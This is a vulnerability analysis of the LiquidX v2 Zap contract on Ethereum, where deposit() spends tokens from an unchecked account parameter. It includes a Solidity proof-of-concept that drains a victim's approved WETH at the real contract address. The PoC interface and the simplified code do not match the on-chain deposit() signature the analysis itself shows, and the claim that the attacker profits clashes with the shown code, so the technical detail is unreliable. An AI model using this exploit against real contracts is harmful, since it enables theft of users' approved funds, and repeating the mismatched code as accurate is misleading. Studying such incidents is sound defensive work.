# LiquidX v2 (LQDX) — Missing Access Control in `deposit` Function Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-15 |
| **Protocol** | LiquidX v2 |
| **Chain** | Ethereum |
| **Loss** | Unconfirmed (PoC: 10 WETH exposure) |
| **Attacker** | Unconfirmed (alert stage) |
| **Vulnerable Contract** | [LiquidXv2Zap 0x364f17A2](https://etherscan.io/address/0x364f17A23AE4350319b7491224d10dF5796190bC) |
| **Root Cause** | The `account` parameter in `deposit()` is not validated to equal `msg.sender`, allowing arbitrary use of tokens approved by third parties |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/LQDX_alert_exp.sol) |

---

## 1. Vulnerability Overview

The `deposit()` function of the LiquidX v2 Zap contract accepts an `account` parameter and uses that account's tokens. However, because there is no validation requiring `account` to equal `msg.sender`, an attacker can supply a victim's address as the `account` parameter and arbitrarily spend WETH that the victim had approved to the zap contract. This vulnerability was discovered at the alert stage before an actual attack occurred.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no check that account equals msg.sender
function deposit(
    address account,         // attacker specifies victim address
    uint256[] calldata amounts,
    SwapBlock[] calldata swapBlocks
) external {
    // account != msg.sender allowed — victim's approved tokens can be spent
    for (uint i = 0; i < amounts.length; i++) {
        IERC20(token).transferFrom(account, address(this), amounts[i]);
    }
    // deposit processed using account's funds
}

// ✅ Safe code: account fixed to msg.sender
function deposit(
    uint256[] calldata amounts,
    SwapBlock[] calldata swapBlocks
) external {
    address account = msg.sender;  // always use caller
    for (uint i = 0; i < amounts.length; i++) {
        IERC20(token).transferFrom(account, address(this), amounts[i]);
    }
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: LiquidXv2Zap.sol
  function deposit(address account, address token, address tokenM, swapPath calldata path, address token0, address token1, uint256[3] calldata amount, uint256 basketId) public payable returns(uint256) {  // ❌ vulnerability
    address pair = ILiquidXv2Factory(factory).getPair(token0, token1);
    require(pair != address(0), "LiquidXv2Zap: no pair");

    // retAddLp 0, 1, 2
    // inAmount
    // token0Amount, token1Amount
    uint256[6] memory lvar;
    lvar[3] = msg.value;
    address inToken = token;
    if (token != address(0)) {
      lvar[3] = IERC20(token).balanceOf(address(this));
      IERC20(token).safeTransferFrom(account, address(this), amount[0]);
      lvar[3] = IERC20(token).balanceOf(address(this)) - lvar[3];
    }
    else {
      inToken = wrappedETH;
      IWETH(wrappedETH).deposit{value: lvar[3]}();
    }

    if (path.path.length > 0) {
      _approveTokenIfNeeded(inToken, swapPlus, lvar[3]);
      (, lvar[3]) = ISwapPlusv1(swapPlus).swap(inToken, lvar[3], tokenM, address(this), path.path);
      inToken = tokenM;
    }

    (lvar[4], lvar[5]) = _depositSwap(token0, token1, inToken, lvar[3]);

    (lvar[0], lvar[1], lvar[2]) = ILiquidXv2Router01(router).addLiquidity(token0, token1, lvar[4], lvar[5], amount[1], amount[2], address(this), block.timestamp);
    _refundReserveToken(account, token0, token1, lvar[4]-lvar[0], lvar[5]-lvar[1]);
    if (basketId == 0) {
      IERC20(pair).safeTransfer(account, lvar[2]);
    }
    else {
      _addBalance(account, pair, basketId, lvar[2]);
    }

    if (rewarder != address(0) && IRewarderv2(rewarder).getReward(account, pair) > 0) {
      IRewarderv2(rewarder).claim(account, pair);
    }

    emit Deposit(account, token0, token1, basketId, lvar[2]);
    return lvar[2];
  }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Confirm victim has approved 10 WETH to LiquidXv2Zap
  │
  ├─→ [2] Query pair reserves (WETH/LQDX pair)
  │
  ├─→ [3] Call deposit(
  │         account = victim,      ← specify victim address
  │         amounts = [victimBalance],
  │         swapBlocks = []
  │       )
  │
  ├─→ [4] victim's 10 WETH → transferred to zap contract
  │
  └─→ [5] Victim balance decreases, attacker profits
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ILiquidXv2Zap {
    struct SwapBlock { address tokenIn; address tokenOut; bytes data; }
    function deposit(
        address account,
        uint256[] calldata amounts,
        SwapBlock[] calldata swapBlocks
    ) external;
}

contract AttackContract {
    ILiquidXv2Zap constant zap  = ILiquidXv2Zap(0x364f17A23AE4350319b7491224d10dF5796190bC);
    IERC20        constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address constant victim = 0x0000000000000000000000000000000000000001;

    function testExploit() external {
        // [1] Check victim's approved allowance
        uint256 allowance = WETH.allowance(victim, address(zap));
        uint256 balance   = WETH.balanceOf(victim);
        uint256 amount    = allowance < balance ? allowance : balance;

        // [2] Construct amounts array
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        // [3] Call deposit with account = victim
        // Victim's WETH is transferred to the zap contract
        ILiquidXv2Zap.SwapBlock[] memory swapBlocks;
        zap.deposit(victim, amounts, swapBlocks);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (abuse of approved tokens) |
| **DApp Category** | DEX Zapper / Liquidity Provision Helper |
| **Impact** | Theft of approved user tokens |

## 6. Remediation Recommendations

1. **Remove `account` parameter**: Always use `msg.sender` instead of accepting `account` as a parameter
2. **Explicit delegation approval**: If delegated execution is required, implement a separate delegation authorization mechanism
3. **Minimize `transferFrom` scope**: Access to user assets via `transferFrom` should only be permitted for the caller themselves
4. **Static analysis tools**: Use Slither or similar tools to automatically detect `msg.sender` mismatch patterns

## 7. Lessons Learned

- Missing `account` validation in the `deposit(account, ...)` pattern is the same class of vulnerability seen in BMI Zapper, Socket Gateway, and others.
- Contracts that aggregate user tokens — such as Zapper contracts — must always include a `msg.sender == account` check.
- Even when discovered at the alert stage before actual losses occur, an immediate patch and recommendation for users to revoke approvals should be issued.